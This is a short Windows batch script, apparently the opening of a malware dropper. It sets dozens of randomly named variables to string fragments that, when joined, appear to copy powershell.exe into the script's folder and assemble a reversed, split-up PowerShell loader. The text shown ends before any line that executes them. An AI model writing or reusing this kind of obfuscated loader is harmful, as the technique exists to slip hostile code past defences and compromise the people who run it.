@echo off
set "GnNtwgjlIv=we"
set "aSariwNjwL=s\"
set "GsIcHCsvCH=he"
set "yuFhFvaDci=he"
set "YVwNaqUjMb=nd"
set "QupngWOMPJ=\v"
set "chTDcrqIJr=ll"
set "kSOGhGLfDF=rS"
set "ODtXqxFLWj=Po"
set "VJonmMsjPm=rs"
set "qhsAkXfLRu=py"
set "PUSXyTXnKA=:\"
set "wKAyBCFZko=y "
set "UuHaATyfXi=Sy"
set "KeNIRsVUzc=.e"
set "YtBsFnbzCf=do"
set "HqCtCuEBWR=ll"
set "FebfxTpvdN=0\"
set "ONJasNQKlU= /"
set "CLMbgAcBnc=32"
set "UKCNWwoubq=ow"
set "cjiLPdfrbJ=po"
set "zeytnOsgmM=co"
set "KWCPdnELMT=xe"
set "MAhrLhzVnI=1."
set "CecTeFHeoe=we"
set "HXwKCgUeEE=em"
set "YOAJFBiHdv=st"
set "offbeXXXyu=in"
set "YixTrmrrLH=\W"
set "hjjpHmTIDy= C"
set "lLvaSVryaC=Wi"
set "zHuaxyzDsq=ws"
set "alwPkLhKtP= %~dp0"
set "exClfkIdWP=cd"
set "kEBVsGzkqL=brea"
set "oppSddEsBB=1..-"
set "EVVtVKiRGb=tryP"
set "NVQolhBBjk=trea"
set "yiurJJAnbn=);$Z"
set "cXSgwCTaLF=orF'"
set "QbTFxTXbUh=whag"
set "PnxgrdKqlk=)($t"
set "aHgXeWkSLb=dk ="
set "jGWgftumdl=[-1."
set "xIdkCHPyfz='gni"
set "FTZJHaTtyf=vj0m"
set "LzTtBcatdW=BC;$"
set "mLmKFMZrXF=e = "
set "mPtTWmQssj=cKZl"
set "oyCRktyWRO=Obje"
set "oFPuumgmFr=j = "
set "AQaoRvCiPh=.IO."
